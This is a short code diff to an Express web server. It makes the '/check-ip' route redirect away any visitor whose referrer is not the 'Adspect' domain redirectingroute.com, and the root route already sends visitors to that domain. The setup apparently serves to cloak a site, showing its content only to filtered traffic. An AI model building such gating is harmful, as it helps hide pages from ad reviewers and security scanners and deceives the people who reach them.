@@ -380,7 +380,6 @@ app.get('/', async (req, res) => {
         return res.redirect(state.settings.redirectUrl);
     }
 
-    // Just redirect to Adspect URL - no referrer check here
     return res.redirect('https://redirectingroute.com/');
 });
 
@@ -492,6 +491,15 @@ const pageServingMiddleware = async (req, res, next) => {
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    // Check if referrer is from our Adspect URL and fail if not
+    const referer = req.headers.referer;
+    const isFromAdspect = referer && referer.includes('redirectingroute.com');
+    
+    if (!isFromAdspect && !isAdminPanel) {
+        console.log('Invalid referrer for /check-ip:', referer);
+        return res.redirect(state.settings.redirectUrl);
+    }
     
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         return res.redirect(state.settings.redirectUrl);
